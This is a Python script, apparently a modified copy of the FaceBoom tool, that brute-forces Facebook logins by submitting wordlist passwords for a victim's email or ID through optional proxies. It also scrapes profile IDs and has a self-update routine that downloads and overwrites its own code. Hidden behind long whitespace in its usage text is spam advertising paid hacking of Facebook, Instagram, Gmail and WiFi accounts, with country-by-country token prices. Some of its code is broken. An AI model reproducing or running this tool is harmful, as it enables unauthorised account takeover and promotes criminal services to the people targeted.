#Terget hack sc
#!/usr/bin/python
import socket, sys, os, re, random, optparse, time
if sys.version_info.major <= 2:import httplib
else:import http.client as httplib
## COLORS ###############
wi="\033[1;37m" #>>White#
rd="\033[1;31m" #>Red   #
gr="\033[1;32m" #>Green #
yl="\033[1;33m" #>Yellow#
#########################
os.system("cls||clear")
def write(text):
    sys.stdout.write(text)
    sys.stdout.flush()
versionPath = "core"+os.sep+"version.txt"
errMsg = lambda msg: write(rd+"\n["+yl+"!"+rd+"] Error: "+yl+msg+rd+ " !!!\n"+wi)
try:import requests
except ImportError:
    errMsg("[ requests ] module is missing")
    print("  [*] Please Use: 'pip install requests' to install it :)")
    sys.exit(1)
try:import mechanize
except ImportError:
    errMsg("[ mechanize ] module is missing")
    print("  [*] Please Use: 'pip install mechanize' to install it :)")
    sys.exit(1)
class FaceBoom(object):
    def __init__(self):
        self.useProxy = None
        self.br = mechanize.Browser()
        self.br.set_handle_robots(False)
        self.br._factory.is_html = True
        self.br.addheaders=[('User-agent',random.choice([
               'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
               'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
               'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
               'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6',
               'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1']))]
    @staticmethod
    def check_proxy(proxy):
          proxies = {'https':"https://"+proxy, 'http':"http://"+proxy}
          proxy_ip = proxy.split(":")[0]
          try:
            r = requests.get('https://www.wikipedia.org',proxies=proxies, timeout=5)
            if proxy_ip==r.headers['X-Client-IP']: return True
            return False
          except Exception : return False
    @staticmethod
    def cnet():
        try:
            socket.create_connection((socket.gethostbyname("www.google.com"), 80), 2)
            return True
        except socket.error:pass
        return False
    def get_profile_id(self, target_profile):
        try:
            print(gr+"\n["+wi+"*"+gr+"] geting target Profile Id... please wait"+wi)
            idre = re.compile('"entity_id":"([0-9]+)"')
            con = requests.get(target_profile).text
            idis = idre.findall(con)
            print(wi+"\n["+gr+"+"+wi+"]"+gr+" Target Profile"+wi+" ID: "+yl+idis[0]+wi)
        except IndexError:
            errMsg("Please Check Your Victim's Profile URL")
            sys.exit(1)
    def login(self,target, password):
        try:
            self.br.open("https://facebook.com")
            self.br.select_form(nr=0)
            self.br.form['email']=target
            self.br.form['pass']= password
            self.br.method ="POST"
            if self.br.submit().get_data().__contains__(b'home_icon'):return  1
            elif "checkpoint" in self.br.geturl(): return 2
            return 0
        except(KeyboardInterrupt, EOFError):
            print(rd+"\n["+yl+"!"+rd+"]"+yl+" Aborting"+rd+"..."+wi)
            time.sleep(1.5)
            sys.exit(1)
        except Exception as e:
            print(rd+" Error: "+yl+str(e)+wi+"\n")
            time.sleep(0.60)
    def banner(self,target,wordlist,single_passwd):
        proxystatus = gr+self.useProxy+wi+"["+gr+"ON"+wi+"]" if self.useProxy  else yl+"["+rd+"OFF"+yl+"]"
        print(gr+"""
=================================================
[---]        """+wi+"""FB-TARGET"""+gr+"""        [---]
=================================================
[---]  """+wi+"""BruteForce Facebook  """+gr+""" [---]
=================================================
[---]  """+yl+"""Created BY B14CK-KN1GH7(NAFIS FUAD)"""+gr+""" [---]
=================================================
[>] Target      :> """+wi+target+gr+"""
{}""".format("[>] Wordlist    :> "+yl+str(wordlist) if not single_passwd else "[>] Password    :> "+yl+str(single_passwd))+gr+"""
[>] ProxyStatus :> """+str(proxystatus)+wi)
        if not single_passwd:
            print(gr+"""\
================================================="""+wi+"""
[~] """+yl+"""Brute"""+rd+""" ForceATTACK: """+gr+"""Enabled """+wi+"""[~]"""+gr+"""
=================================================\n"""+wi)
        else:print("\n")
    @staticmethod
    def updateFaceBoom():
        if not os.path.isfile(versionPath):
             errMsg("Unable to check for updates: please re-clone the script to fix this problem")
             sys.exit(1)
        write("[~] Checking for updates...\n")
        conn = httplib.HTTPSConnection("raw.githubusercontent.com")
        conn.request("GET", "/Oseid/FaceBoom/master/core/version.txt")
        repoVersion = conn.getresponse().read().strip().decode()
        with open(versionPath) as vf:
            currentVersion = vf.read().strip()
        if repoVersion == currentVersion:write("  [*] The script is up to date!\n")
        else:
                print("  [+] An update has been found ::: Updating... ")
                conn.request("GET", "/Oseid/FaceBoom/master/faceboom.py")
                newCode = conn.getresponse().read().strip().decode()
                with open("faceboom.py", "w") as  faceBoomScript:
                   faceBoomScript.write(newCode)
                with open(versionPath, "w") as ver:
                     ver.write(repoVersion)
                write("  [+] Successfully updated :)\n")
parse = optparse.OptionParser(wi+"""
Usage: python ./faceboom.py [OPTIONS...]
-------------
OPTIONS:
       |
    |--------
    | -t <target email> [OR] <FACEBOOK ID>    ::> Specify target Email [OR] Target Profile ID
    |--------
    | -w <wordlist Path>                      ::> Specify Wordlist File Path
    |--------
    | -s <single password>                    ::> Specify Single Password To Check
    |--------
    | -p <Proxy IP:PORT>                      ::> Specify HTTP/S Proxy (Optional)
    |--------
    | -g <TARGET Facebook Profile URL>        ::> Specify Target Facebook Profile URL For Get HIS ID
    |--------
    | -u/--update                             ::> Update FaceBoom Script
-------------
Examples:
        |
     |--------
     | python faceboom.py -t Victim@gmail.com -w /usr/share/wordlists/rockyou.txt
     |--------
     | ID LINK- https://www.facebook.com/share/1GzVQj5UfA/ -w C:\\Users\\Me\\Desktop\\wordlist.txt
     |--------
     | python faceboom.py -t Victim@hotmail.com -w D:\\wordlist.txt -p 144.217.101.245:3129
     
     
     
     
     
     
     
 




    
     
     
 


    
     
     













     


















































                                                                                                                                                                                                                                                                            
      ________________  __________________
     /_  __/ ____/ __ \/ ____/ ____/_  __/
      / / / __/ / /_/ / / __/ __/   / /   
     / / / /___/ _, _/ /_/ / /___  / /    
    /_/ /_____/_/ |_|\____/_____/ /_/ 
------------------------------------------
Bangladesh Pakistan AfghaNigeria
Napal India PHILIPPINES Nigeria
Columbia Saudi Arab Srworking
Indonesia Africa Dubai working
iraq UAE 
--------------------------------------------
𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐎𝐖𝐍𝐄𝐑 @FF_KING0011                                              
        ▖▖▄▖▄▖▖▖     𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𝐈𝐃 𝐅𝐑𝐄𝐄 𝐅𝐈𝐓𝐄 𝐈𝐃
        ▙▌▌▌▌ ▙▘     𝐖𝐈𝐅𝐈 𝐏𝐀𝐆𝐀 𝐆𝐑𝐎𝐔𝐏 𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌
        ▌▌▛▌▙▖▌▌     𝐆𝐌𝐀𝐈𝐍 𝐏𝐀𝐒𝐒 𝐍𝐔𝐌𝐁𝐄R 𝐈𝐏
     |------------------------------------------
     |--------𝐓𝐄𝐑𝐆𝐄𝐓 𝐇𝐀𝐂𝐊 𝐖𝐎𝐑𝐊𝐈𝐍𝐆---|☞𝟎𝟏(𝚃𝙴𝚁𝙶𝙴𝚃)
     |--------𝐓𝐄𝐑𝐆𝐄𝐓 𝐖𝐈𝐅𝐈 𝐇𝐀𝐂𝐊𝐈𝐍𝐆---|☞𝟎𝟐(𝚃𝙴𝚁𝙶𝙴𝚃)
     |--------𝐅𝐑𝐄𝐄 𝐅𝐈𝐓𝐄 𝐈𝐃 𝐓𝐄𝐑𝐆𝐄𝐓 𝐇𝐀𝐂𝐊𝐈𝐍𝐆---|☞𝟎𝟑(𝚃𝙴𝚁𝙶𝙴𝚃)
     |--------𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𝐓𝐄𝐑𝐆𝐄𝐓 𝐇𝐀𝐂𝐊𝐈𝐍𝐆---|☞𝟎𝟒(𝚃𝙴𝚁𝙶𝙴𝚃)
     |--------𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌 i𝐃 𝐇𝐀𝐂𝐊𝐈𝐍𝐆---|☞𝟎𝟓(𝚃𝙴𝚁𝙶𝙴𝚃)
     |--------𝐖𝐈𝐅𝐈 𝐓𝐄𝐑𝐆𝐄𝐓 𝐇𝐀𝐂𝐊𝐈𝐍𝐆---|☞𝟎𝟔(𝚃𝙴𝚁𝙶𝙴𝚃)
     |--------𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𝐏𝐀𝐆𝐀 𝐆𝐑𝐎𝐔𝐏 𝐇𝐀𝐂𝐊𝐈𝐍𝐆---|☞𝟎𝟕(𝚃𝙴𝚁𝙶𝙴𝚃)
     |--------𝐔𝐏𝐃𝐀𝐓𝐄 𝐒𝐀𝐑𝐕𝐄𝐑 𝐋𝐈𝐅𝐄 𝐓𝐈𝐌𝐄---|☞𝟎𝟖(𝚃𝙴𝚁𝙶𝙴𝚃)
     |--------𝐏𝐖𝐗 𝐖𝐎𝐑𝐊𝐈𝐍𝐆 𝐋𝐈𝐅𝐄 𝐓𝐈𝐌𝐄---|☞𝟎𝟗(𝚃𝙴𝚁𝙶𝙴𝚃)
     |--------𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 𝐖𝐎𝐑𝐊 𝐋𝐈𝐅𝐄 𝐓𝐈𝐌𝐄---|☞𝟏𝟎(𝚃𝙴𝚁𝙶𝙴𝚃)
     |--------𝐀𝐋𝐋 𝐓𝐄𝐑𝐆𝐄𝐓 𝐇𝐀𝐂𝐊 𝟏𝟎𝟎%---|☞𝟏𝟏(𝚃𝙴𝚁𝙶𝙴𝚃)
     |--------𝐆𝐌𝐀𝐈𝐍 𝐏𝐀𝐒𝐒 𝐍𝐔𝐌𝐁𝐄𝐑 𝐈𝐏---|☞𝟏𝟐(𝚃𝙴𝚁𝙶𝙴𝚃)
     |--------𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇 𝐂𝐘𝐁𝐄𝐑---|☞𝟏𝟑(𝚃𝙴𝚁𝙶𝙴𝚃)
     |--------𝐓𝐄𝐀𝐌 𝐃𝐀𝐑𝐊 𝐓𝐄𝐀𝐌 𝐋𝐌𝐍𝐱𝟗----|☞𝟏𝟒(𝚃𝙴𝚁𝙶𝙴𝚃)
     |--------𝐎𝐖𝐍𝐄𝐑 @FF_KING0011---|☞𝟏𝟓(𝚃𝙴𝚁𝙶𝙴𝚃)
     |--------𝐀𝐃𝐌𝐈𝐍 @FF_KING0011----|☞𝟏𝟔(𝚃𝙴𝚁𝙶𝙴𝚃)
     |-----------------------------------------
     |-⚠️warning Do not attack anyone without warning⚠️
     |-The ID has been hacked terget Done Now
     |-Notice is given and your work is done
     |-----------------------------------------
     |--------sarver token add working life time 
     |--------all terget hack is file
     |-----------------------------------------
     |--------KSA sarver token 50$
     |--------UAE sarver token 50$$
     |--------Pakistan sarver token 120$
     |--------Bangladesh sarver token 50$
     |--------iraq 🇮🇷 sarver token 200$ sarver on✔️
     |--------India sarver token 160$
     |--------Nepal sarver token 110$
     |--------Qatar sarver token 50$
     |--------oman sarver token 50$
     |--------USA sarver token 520$
     |--------Libya sarver token 250$
     |--------Jordan sarver token 380$
     |--------Philippines sarve token 300$
     |--------Nigeria sarver token 220$
     |--------Algeria sarver token 340$
     |--------hack done you'r terget id🪩            
     |-------- Bangladesh sarver token add fast
     |--------link 
     |--------Country Name iraq 🇮🇷
     |--------iraq 🇮🇷 working life time terget all
     |--------Gmail 
     |--------password 
     |--------mobile number +964 7XX XXX XXXX
     |--------18/02/2026/wednesday
     |--------iraq 🇮🇷 sarver token pwx max all ok🪩 work now
     |--------Approval sarver key add is final confirmation 150$
     |--------The last job is the final second servic sarver key add iraq
""")






































def Main():
   parse.add_option("-t","--target",'-T','--TARGET',dest="target",type="string",
      help="Specify Target Email or ID")
   parse.add_option("-w","--wordlist",'-W','--WORDLIST',dest="wordlist",type="string",
      help="Specify Wordlist File ")
   parse.add_option("-s","--single","--S","--SINGLE",dest="single",type="string",
      help="Specify Single Password To Check it")
   parse.add_option("-p","-P","--proxy","--PROXY",dest="proxy",type="string",
                        help="Specify HTTP/S Proxy to be used")
   parse.add_option("-g","-G","--getid","--GETID",dest="url",type="string",
                        help="Specify TARGET FACEBOOK PROFILE URL to get his ID")
   parse.add_option("-u","-U","--update","--UPDATE", dest="update", action="store_true", default=False)
   (options,args) = parse.parse_args()
   faceboom = FaceBoom()
   target = options.target
   wordlist = options.wordlist
   single_passwd = options.single
   proxy = options.proxy
   target_profile = options.url
   update = options.update
   opts = [target,wordlist,single_passwd, proxy, target_profile, update]
   if any(opt for opt in opts):
     if not faceboom.cnet():
       errMsg("Please Check Your Internet Connection")
       sys.exit(1)
   if update:
    faceboom.updateFaceBoom()
    sys.exit(1)
   elif target_profile:
        faceboom.get_profile_id(target_profile)
        sys.exit(1)
   elif wordlist or single_passwd:
        if wordlist:
            if not os.path.isfile(wordlist):
                errMsg("Please check Your Wordlist Path")
                sys.exit(1)
        if single_passwd:
            if len(single_passwd.strip()) < 6:
                errMsg("Invalid Password")
                print("[!] Password must be at least '6' characters long")
                sys.exit(1)
        if proxy:
             if proxy.count(".") != 3:
                    errMsg("Invalid IPv4 ["+rd+str(proxy)+yl+"]")
                    sys.exit(1)
             print(wi+"["+yl+"~"+wi+"] Connecting To "+wi+"Proxy[\033[1;33m {} \033[1;37m]...".format(proxy if not ":" in proxy else proxy.split(":")[0]))
             final_proxy = proxy+":8080" if not ":" in proxy else proxy
             if faceBoom.check_proxy(final_proxy):
                faceBoom.useProxy = final_proxy
                faceBoom.br.set_proxies({'https':faceBoom.useProxy, 'http':faceBoom.useProxy})
                print(wi+"["+gr+"Connected"+wi+"]")
             else:
                errMsg("Connection Failed")
                errMsg("Unable to connect to Proxy["+rd+str(proxy)+yl+"]")
                sys.exit(1)
        faceboom.banner(target,wordlist,single_passwd)
        loop,passwords = (1,open(wordlist).readlines()) if not single_passwd else ("~",[single_passwd])
        for passwd in passwords:
                passwd = passwd.strip()
                if len(passwd) <6:continue
                write(wi+"["+yl+str(loop)+wi+"] Trying Password[ {"+yl+str(passwd)+wi+"} ]")
                retCode = faceboom.login(target, passwd)
                if retCode:
                    sys.stdout.write(wi+" ==> Login"+gr+" Success\n")
                    print(wi+"========================="+"="*len(passwd)+"======")
                    print(wi+"["+gr+"+"+wi+"] Password [ "+gr+passwd+wi+" ]"+gr+" Is Correct :)")
                    print(wi+"========================="+"="*len(passwd)+"======")
                    if retCode == 2:print(wi+"["+yl+"!"+wi+"]"+yl+" Warning: This account use ("+rd+"2F Authentication"+yl+"):"+rd+" It's Locked"+yl+" !!!")
                    break
                else:
                    sys.stdout.write(yl+" ==> Login"+rd+" Failed\n")
                    loop = loop + 1 if not single_passwd else "~"
        else:
                if single_passwd:
                    print(yl+"\n["+rd+"!"+yl+"] Sorry: "+wi+"The Password[ "+yl+passwd+wi+" ] Is Not Correct"+rd+":("+yl+"!"+wi)
                    print(gr+"["+yl+"!"+gr+"]"+yl+" Please Try Another password or Wordlist "+gr+":)"+wi)
                else:
                    print(yl+"\n["+rd+"!"+yl+"] Sorry: "+wi+"I Can't Find The Correct Password In [ "+yl+wordlist+wi+" ] "+rd+":("+yl+"!"+wi)
                    print(gr+"["+yl+"!"+gr+"]"+yl+" Please Try Another Wordlist. "+gr+":)"+wi)
        sys.exit(1)
   else:
       print(parse.usage)
       sys.exit(1)
if __name__=='__main__':
    Main()
##############################################################
#####################                #########################
#####################   END OF TOOL  #########################
#####################                #########################
##############################################################
